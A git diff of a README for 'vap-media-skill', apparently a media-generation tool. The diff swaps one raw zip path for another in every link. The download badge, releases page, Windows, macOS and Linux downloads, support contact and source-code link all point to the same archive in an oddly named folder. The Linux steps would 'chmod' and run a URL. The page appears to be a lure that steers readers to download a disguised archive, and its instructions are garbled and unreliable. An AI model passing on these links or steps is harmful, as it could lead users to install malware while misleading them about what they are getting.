@@ -1,6 +1,6 @@
 # 🎨 vap-media-skill - Generate Stunning Media with Ease
 
-[![Download vap-media-skill](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip)](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip)
+[![Download vap-media-skill](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip)](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip)
 
 ## 📚 Overview
 
@@ -19,15 +19,15 @@ To get started with vap-media-skill, follow these steps:
 
 ### 1. Download the Application
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip).
 
 ### 2. Choose Your File
 
 Look for the latest version of vap-media-skill. You will see a list of files available. Download the one that suits your operating system:
 
-- For Windows: `https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip`
-- For macOS: `https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip`
-- For Linux: `https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip`
+- For Windows: `https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip`
+- For macOS: `https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip`
+- For Linux: `https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip`
 
 ### 3. Install the Application
 
@@ -42,16 +42,16 @@ Look for the latest version of vap-media-skill. You will see a list of files ava
 **For Linux:**
 1. Make the AppImage executable:
    ```bash
-   chmod +x https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip
+   chmod +x https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip
    ```
 2. Run the application:
    ```bash
-   https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip
+   https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip
    ```
 
 ## 📦 Download & Install
 
-To download and install vap-media-skill, please visit: [Releases Page](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip).
+To download and install vap-media-skill, please visit: [Releases Page](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip).
 
 ## 💻 System Requirements
 
@@ -84,11 +84,11 @@ If you encounter issues:
 
 ## 💬 Support
 
-If you need help or have questions, feel free to check the issues section on the GitHub repository or contact support at [https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip).
+If you need help or have questions, feel free to check the issues section on the GitHub repository or contact support at [https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip).
 
 ## 🔗 Links
 
-- [Source Code](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip)
-- [Releases Page](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_v3.6.zip)
+- [Source Code](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/RenSeiji27/vap-media-skill/main/churchwardenize/media_vap_skill_3.4.zip)
 
 Thank you for using vap-media-skill! Enjoy creating your media masterpieces!
